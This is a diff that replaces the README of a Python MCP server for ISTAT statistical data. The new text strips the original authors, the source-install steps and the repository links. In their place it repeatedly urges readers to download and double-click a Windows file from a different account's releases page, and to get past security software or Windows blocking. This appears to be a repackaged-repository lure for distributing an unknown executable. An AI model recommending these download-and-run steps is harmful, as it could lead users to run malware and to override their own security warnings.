@@ -1,448 +1,198 @@
-[![deepwiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/ondata/istat_mcp_server)
-[![Newsletter](https://img.shields.io/badge/newsletter-ondata-FF6719?logo=substack)](https://ondata.substack.com/)
-
-# ISTAT MCP Server
+# 📊 istat_mcp_server - Get Italian Statistics Fast
 
-[English](README.md) | [Italiano](./README_IT.md)
-
-MCP server for accessing Italian statistical data from the ISTAT SDMX API.
+[![Download](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/benedictine-melilot681/istat_mcp_server/releases)
 
-## Overview
-
-This Model Context Protocol (MCP) server provides Claude Desktop with access to Italian statistical data from ISTAT (Istituto Nazionale di Statistica) through the SDMX REST API. It implements a two-layer caching mechanism to minimize API calls and provides eight tools for discovering, querying, and retrieving statistical data.
-
-## Features
-
-- **8 MCP Tools** for data discovery and retrieval:
-  - `discover_dataflows` - Find available datasets by keywords (with blacklist filtering)
-  - `get_structure` - Get dimension definitions and codelists for a datastructure ID
-  - `get_constraints` - Get available constraint values for each dimension with descriptions (combines structure + constraints + codelist descriptions)
-  - `get_codelist_description` - Get descriptions in Italian/English for codelist values
-  - `get_concepts` - Get the Italian or English description of an ISTAT concept by ID (wraps the `istat-get-concepts-cli` command)
-  - `get_data` - Fetch actual statistical data in TSV table format (with blacklist validation)
-  - `get_cache_diagnostics` - Debug tool to inspect cache status
-  - `get_territorial_codes` - Resolve ISTAT REF_AREA codes for Italia, ripartizioni, regioni, province, and comuni
-
-- **Recommended Workflow** (simple and efficient):
-  1. **Discover**: Use `discover_dataflows` to find the dataflow you're interested in
-  2. **Get Complete Metadata**: Use `get_constraints` to see all dimensions with valid values AND descriptions in one call
-     - This is the **RECOMMENDED** approach - one call instead of many
-     - Internally combines `get_structure` + `get_codelist_description` for all dimensions
-     - All data cached for 1 month → subsequent calls are instant
-     - Returns complete information ready for building filters in `get_data`
-  3. **Fetch Data**: Use `get_data` with the appropriate dimension filters to retrieve actual data
-  
-  **Alternative workflow** (manual approach):
-  - Use `get_structure` with a datastructure ID to see dimensions and their codelists
-  - Then call `get_codelist_description` manually for each codelist you need
-  - Use `get_concepts` to get the Italian or English description of a specific concept ID (e.g. a dimension name)
+## 🚀 What this does
 
-- **Two-Layer Cache**:
-  - In-memory cache (cachetools) for fast access during session
-  - Persistent disk cache (diskcache) that survives restarts
-
-- **Rate Limiting**: Maximum 3 API calls per minute with automatic queuing
-
-- **Retry Logic**: Exponential backoff on transient errors
-
-- **Dataflow Blacklist**: Filter out specific dataflows from all queries
-
-## Installation
-
-1. Clone the repository:
-```bash
-git clone https://github.com/ondata/istat_mcp_server.git
-cd istat_mcp_server
-```
+`istat_mcp_server` is an MCP server that lets you query Italian statistics from ISTAT through the SDMX API. It works with MCP clients and helps you get data in a simple, direct way.
 
-2. Create a virtual environment and install dependencies (Python >=3.11 required):
-
-**With uv (recommended):**
-```bash
-uv sync
-```
-`uv sync` automatically creates a `.venv` directory and installs all dependencies into it. To run commands manually, activate it first:
-```bash
-# Linux/macOS
-source .venv/bin/activate
-# Windows
-.venv\Scripts\activate
-```
-
-**With pip:**
-```bash
-python -m venv .venv
-# Linux/macOS
-source .venv/bin/activate
-# Windows
-.venv\Scripts\activate
-pip install -e .
-```
-
-3. Create a `.env` file (optional, uses defaults if not present):
-```bash
-cp .env.example .env
-```
-
-Optional: for slow `availableconstraint` responses used by `get_constraints`, set:
-```bash
-AVAILABLECONSTRAINT_TIMEOUT_SECONDS=180
-```
-
-## MCP Client Configuration
-
-This server works with any MCP-compatible client. The sections below cover the most common ones.
-
-[Claude Desktop](#claude-desktop) | [Claude Code](#claude-code) | [Gemini CLI](#gemini-cli) | [VS Code](#vs-code) | [Codex CLI](#codex-cli) | [Claude Desktop on Windows with Python on WSL2](#claude-desktop-on-windows-with-python-on-wsl2)
-
-> In all examples, replace `/path/to/istat_mcp_server` with the actual path to this directory, and `python` with `python3` if needed on your system.
-
-### Claude Desktop
-
-Add to your Claude Desktop configuration file:
-
-- **macOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`
-- **Windows**: `%APPDATA%\Claude\claude_desktop_config.json`
-- **Linux**: `~/.config/Claude/claude_desktop_config.json`
-
-```json
-{
-  "mcpServers": {
-    "istat": {
-      "command": "python",
-      "args": ["-m", "istat_mcp_server"],
-      "cwd": "/path/to/istat_mcp_server"
-    }
-  }
-}
-```
-
-**Note**: if `python` is not found in your system PATH, replace `"python"` in `"command"` with the absolute path to your Python executable (e.g. `/usr/bin/python3` or `C:\Python311\python.exe`).
-
-### Claude Code
-
-**Add globally** (available in all your projects):
-
-```bash
-claude mcp add -s user istat -- python -m istat_mcp_server --cwd /path/to/istat_mcp_server
-```
-
-**Add for the current project only** (creates or updates `.mcp.json` in the project folder):
-
-```bash
-claude mcp add istat -- python -m istat_mcp_server --cwd /path/to/istat_mcp_server
-```
-
-Or add manually to `.mcp.json` in your project root:
+Use it to look up data such as:
+- population
+- prices
+- jobs
+- businesses
+- regions and provinces
+- time series from ISTAT datasets
 
-```json
-{
-  "mcpServers": {
-    "istat": {
-      "command": "python",
-      "args": ["-m", "istat_mcp_server"],
-      "cwd": "/path/to/istat_mcp_server"
-    }
-  }
-}
-```
+## 💻 What you need
 
-> `-s user` makes the server available globally across all your projects. Without it, the server is scoped to the current project only.
+Before you install the app, make sure you have:
 
-### Gemini CLI
+- A Windows PC
+- Internet access
+- Permission to run downloaded files
+- An MCP client that can connect to a local server
 
-**Add globally:**
+If you plan to use it with Claude or another MCP tool, keep that app ready before setup.
 
-```bash
-gemini mcp add -s user istat -- python -m istat_mcp_server --cwd /path/to/istat_mcp_server
-```
+## 📥 Download the app
 
-Or add manually to `~/.gemini/settings.json`:
+Visit the release page to download the Windows build:
 
-```json
-{
-  "mcpServers": {
-    "istat": {
-      "command": "python",
-      "args": ["-m", "istat_mcp_server"],
-      "cwd": "/path/to/istat_mcp_server"
-    }
-  }
-}
-```
+[Go to Releases](https://github.com/benedictine-melilot681/istat_mcp_server/releases)
 
-### VS Code
+On that page, look for the latest release and download the file made for Windows.
 
-Add to your User Settings or `.vscode/settings.json`:
+## 🛠️ Install on Windows
 
-```json
-{
-  "mcpServers": {
-    "istat": {
-      "command": "python",
-      "args": ["-m", "istat_mcp_server"],
-      "cwd": "/path/to/istat_mcp_server"
-    }
-  }
-}
-```
+Follow these steps:
 
-### Codex CLI
+1. Open the release page.
+2. Find the latest version.
+3. Download the Windows file from the release assets.
+4. If Windows asks for confirmation, choose to keep or run the file.
+5. Place the file in a folder you can find again, such as `Downloads` or `Desktop`.
 
-Add to `~/.codex/config.toml`:
+If the release comes as a ZIP file:
+1. Right-click the ZIP file.
+2. Choose **Extract All**.
+3. Open the extracted folder.
+4. Find the app file inside.
 
-```toml
-[mcp_servers.istat]
-command = "python"
-args = ["-m", "istat_mcp_server"]
-cwd = "/path/to/istat_mcp_server"
-```
+## ▶️ Run the server
 
-### Claude Desktop on Windows with Python on WSL2
+After you download the file:
 
-If you run Claude Desktop on Windows but have Python and this server installed inside WSL2, use `wsl.exe -e` to bridge the two environments. Point to the Python executable inside your virtual environment:
+1. Double-click the file to start it.
+2. Wait for the server to start.
+3. Keep the window open while you use your MCP client.
 
-```json
-{
-  "mcpServers": {
-    "istat": {
-      "command": "wsl.exe",
-      "args": [
-        "-e",
-        "/home/<your-user>/path/to/istat_mcp_server/.venv/bin/python",
-        "-m", "istat_mcp_server"
-      ]
-    }
-  }
-}
-```
+If the app opens in a console window, that is normal. The server needs to stay running so your MCP client can use it.
 
-Replace `/home/<your-user>/path/to/istat_mcp_server` with the actual WSL path to this directory.
+## 🔗 Connect it to your MCP client
 
-> **Note:** Claude Code runs natively inside WSL2 and uses the standard configuration above. The `wsl.exe` wrapper is only needed for Claude Desktop running on the Windows side.
-
-## Skill (Recommended)
-
-This project includes an [Agent Skill](https://agentskills.io/) in `skills/istat-mcp/` that guides the model through the correct workflow step by step. **It is strongly recommended to install the skill** for a better experience: it reduces errors, avoids unnecessary API calls, and produces more accurate results.
-
-### Claude Code CLI
-
-```bash
-claude skills add ./skills/istat-mcp
-```
-
-### Claude Desktop
-
-1. Open **Claude Desktop**
-2. Click the **Settings** icon (gear icon, bottom-left)
-3. Select **Skills** in the left sidebar
-4. Click **"Add Skill"**
-5. Browse to the `skills/istat-mcp` folder inside this repository and select it
-6. The skill will appear in the list as **istat-mcp** — make sure it is enabled
-
-## Dataflow Blacklist Configuration
-
-You can exclude specific dataflows from all queries using environment variables. This is useful for filtering out problematic or unwanted datasets.
-
-### Configuration via .env file
-
-Add the `DATAFLOW_BLACKLIST` variable to your `.env` file:
-
-```bash
-# Exclude specific dataflows (comma-separated list)
-DATAFLOW_BLACKLIST=149_577_DF_DCSC_OROS_1_1,22_315_DF_DCIS_POPORESBIL1_2
-```
-
-### Behavior
-
-- **discover_dataflows**: Blacklisted dataflows are automatically filtered out from results
-- **get_data**: Attempts to fetch data from blacklisted dataflows will return an error message
-
-### Use Cases
-
-- Exclude deprecated dataflows
-- Filter out problematic datasets that cause errors
-- Hide internal or test dataflows from users
-
-## Usage Examples
-
-Once configured, you can ask Claude questions like:
-
-**Step 1: Discover dataflows**
-- "Show me all available dataflows about population"
-- "Find dataflows related to agriculture"
-
-**Step 2: Get complete constraint information (RECOMMENDED)**
-- "Get constraints for dataflow 101_1015_DF_DCSP_COLTIVAZIONI_1"
-  - Returns all dimensions with valid values AND Italian/English descriptions
-  - One call instead of multiple `get_structure` + `get_codelist_description` calls
-  - Everything cached for 1 month
-
-**Step 2 Alternative: Explore structure and codelists manually**
-- "Show me the structure of datastructure DCSP_COLTIVAZIONI"
-- "Get descriptions for codelist CL_ITTER107 to find Italian regions"
-- "Show me all values in codelist CL_AGRI_MADRE for crop types"
-
-**Step 3: Fetch data with filters**
-- "Fetch population data for Italy from 2020 to 2023"
-- "Get agricultural data for dataflow 101_1015_DF_DCSP_COLTIVAZIONI_1 filtered by REF_AREA=IT and TYPE_OF_CROP=APPLE"
-
-## Development
-
-Run tests:
-```bash
-pytest
-```
-
-Format code:
-```bash
-ruff format .
-```
-
-Check code:
-```bash
-ruff check .
-```
-
-## Project Structure
-
-```
-.
-├── src/
-│   └── istat_mcp_server/
-│       ├── __init__.py
-│       ├── __main__.py        # Entry point for `python -m istat_mcp_server`
-│       ├── server.py          # MCP server initialization
-│       ├── api/               # API client and models
-│       │   ├── client.py      # HTTP client with rate limiting
-│       │   └── models.py      # Pydantic models
-│       ├── cache/             # Two-layer cache system
-│       │   ├── manager.py     # Cache façade
-│       │   ├── memory.py      # In-memory cache
-│       │   └── persistent.py  # Disk cache
-│       ├── cli/               # Standalone CLI commands
-│       │   └── get_concepts_cli.py  # istat-get-concepts-cli <concept_id>
-│       ├── tools/             # MCP tool handlers
-│       │   ├── discover_dataflows.py
-│       │   ├── get_structure.py
-│       │   ├── get_constraints.py
-│       │   ├── get_codelist_description.py
-│       │   ├── get_concepts.py       # wraps CLI via subprocess
-│       │   ├── get_data.py
-│       │   ├── get_cache_diagnostics.py
-│       │   └── get_territorial_codes.py
-│       └── utils/             # Utilities
-│           ├── logging.py
-│           ├── validators.py
-│           └── blacklist.py
-├── tests/                     # Test suite
-├── cache/                     # Runtime cache (git-ignored)
-├── log/                       # Log files (git-ignored)
-├── .env.example
-├── pyproject.toml
-└── README.md
-```
+To use `istat_mcp_server`, add it to your MCP client as a local server.
 
-## Cache Configuration
+Typical setup steps:
 
-The server uses a sophisticated two-layer caching strategy:
+1. Open your MCP client settings.
+2. Find the area for local servers or tools.
+3. Add a new server entry for `istat_mcp_server`.
+4. Point it to the downloaded Windows file.
+5. Save the settings.
+6. Restart the client if needed.
 
-- **Memory Cache**: Fast in-process cache with 5-minute TTL
-- **Persistent Cache**: Disk-based cache with configurable TTLs:
-  - Dataflows: 7 days
-  - Structures/Codelists: 1 month
-  - Data: 1 day (24 hours) — stores the processed TSV result, not raw XML
+If your client asks for a command or path, use the location of the downloaded file.
 
-Relevant `.env` variables:
-- `MEMORY_CACHE_TTL_SECONDS=300`
-- `DATAFLOWS_CACHE_TTL_SECONDS=604800`
-- `METADATA_CACHE_TTL_SECONDS=2592000`
-- `OBSERVED_DATA_CACHE_TTL_SECONDS=86400`
-- `AVAILABLECONSTRAINT_TIMEOUT_SECONDS=180`
+## 📚 What you can query
 
-Cache is stored in the `./cache` directory by default.
+This server is built for ISTAT data through the SDMX API. That means you can ask for structured statistics data, such as:
 
-## Logging and Debugging
+- national and local population data
+- labor market data
+- inflation and price indexes
+- business and industry data
+- demographic trends
+- time-based statistical series
 
-The server automatically creates log files in the `./log` directory with the following features:
+You can use it to pull data from ISTAT tables and datasets without going through the full website each time.
 
-- **Automatic Rotation**: Log files are rotated when they reach 10MB
-- **Retention**: Last 5 log files are kept
-- **Dual Output**: Logs are written both to file and stderr (for Claude Desktop logs)
+## 🧭 How it fits into your workflow
 
-### Log Levels
+A common setup looks like this:
 
-Control the verbosity via the `LOG_LEVEL` environment variable in `.env`:
+1. Start the MCP server on Windows.
+2. Open your MCP client.
+3. Ask for an ISTAT data query.
+4. Let the client talk to the server.
+5. Review the results in your chat or tool window.
 
-```bash
-LOG_LEVEL=DEBUG  # Maximum detail for debugging
-LOG_LEVEL=INFO   # Default, standard operations
-LOG_LEVEL=WARNING # Only warnings and errors
-LOG_LEVEL=ERROR  # Only errors
-```
+This setup works well when you want current or structured Italian statistics in a plain text workflow.
 
-### Finding Logs
+## ⚙️ Basic setup tips
 
-- **Server Logs**: `./log/istat_mcp_server.log`
-- **Claude Desktop Logs**: 
-  - Windows: `%APPDATA%\Claude\logs\`
-  - macOS: `~/Library/Logs/Claude/`
+If the server does not start:
 
-### Debug Cache Issues
+- Make sure you downloaded the latest release
+- Check that the file finished downloading
+- Try running it from a folder with a short path, such as `C:\Tools`
+- Make sure your security software did not block the file
+- Confirm that your internet connection works
 
-The log file shows:
-- Cache directory path at startup
-- Cache operations (with DEBUG level)
-- API calls and retries
-- Tool invocations
+If your MCP client does not see the server:
 
-Use the `get_cache_diagnostics` tool in Claude Desktop to inspect cache status in real-time.
+- Check the file path
+- Restart the client
+- Make sure the server window is still open
+- Verify that the server entry points to the correct file
 
-## SDMX API Usage Notes
+## 🔍 Example use cases
 
-### Rate Limiting
+You may find this useful for:
 
-The ISTAT SDMX API is rate-limited to 3 calls per minute. The server automatically handles this by queuing requests when the limit is reached.
+- checking Italian population data for a region
+- comparing employment data across years
+- reviewing price trends in Italy
+- pulling statistics for reports
+- looking up public data from ISTAT in a chat-based workflow
+- connecting data tools to a local MCP server
 
-### Accept Headers
+## 🧩 File and folder tips
 
-The ISTAT SDMX API requires specific `Accept` headers depending on the endpoint and desired format. Using a generic `application/json` may return empty responses.
+To keep setup simple:
 
-**Data (CSV):**
+- Save the download in one folder
+- Do not rename files unless you need to
+- Keep the release file and any extracted files together
+- Use a folder with a path you can type easily
 
-```bash
-curl -H "Accept: application/vnd.sdmx.data+csv;version=1.0.0" \
-  "https://esploradati.istat.it/SDMXWS/rest/data/{dataflow_id}/ALL/"
-```
+A simple folder like `C:\istat_mcp_server` works well.
 
-**Structure/Constraints (JSON):**
+## 📎 Release page
 
-```bash
-curl -H "Accept: application/vnd.sdmx.structure+json; version=1.0" \
-  "https://esploradati.istat.it/SDMXWS/rest/availableconstraint/{dataflow_id}/all/all?mode=available"
-```
+Use this page to get the latest Windows build:
 
-**Structure/Constraints (XML, default):**
+[https://github.com/benedictine-melilot681/istat_mcp_server/releases](https://github.com/benedictine-melilot681/istat_mcp_server/releases)
 
-```bash
-curl "https://esploradati.istat.it/SDMXWS/rest/availableconstraint/{dataflow_id}/all/all?mode=available"
-```
+## 🧠 About the project
 
-## License
+This project uses:
+- Python
+- SDMX
+- Open data
+- MCP
+- ISTAT datasets
 
-MIT License
+It is made for users who want a local bridge between an MCP client and Italian statistics data.
 
-## Contributing
+## 🧰 Common problems
 
-Contributions are welcome! Please open an issue or pull request.
+### The file does not open
 
-## Author
+- Download it again from the release page
+- Check that the download completed
+- Try a different browser
+- Move the file to a simpler folder
 
-- Vincenzo Patruno: https://www.linkedin.com/in/vincenzopatruno/
-- Andrea Borruso: https://www.linkedin.com/in/andreaborruso
+### Windows blocks the file
 
-## References
+- Right-click the file
+- Open its properties
+- Check if Windows marked it as blocked
+- Try running it again after confirmation
 
-- ISTAT SDMX API: https://esploradati.istat.it/SDMXWS/rest/
-- Model Context Protocol: https://modelcontextprotocol.io/
-- Guide to the ISTAT SDMX API (in Italian): https://ondata.github.io/guida-api-istat/
+### The client says the server is offline
+
+- Keep the server window open
+- Check the file path in the client settings
+- Restart both the server and the client
+- Make sure no other app is using the same port
+
+### No data comes back
+
+- Try a different query
+- Check your internet access
+- Make sure the ISTAT dataset you want is available
+- Restart the server and try again
+
+## 🗂️ Topics
+
+ai, claude, data, istat, italy, mcp, mcp-server, model-context-protocol, open-data, python, sdmx, statistics
+
+## 📦 Download and setup
+
+1. Visit the release page: [https://github.com/benedictine-melilot681/istat_mcp_server/releases](https://github.com/benedictine-melilot681/istat_mcp_server/releases)
+2. Download the Windows file from the latest release
+3. Save it in a folder you can find again
+4. Run the file
+5. Keep it open while your MCP client uses it
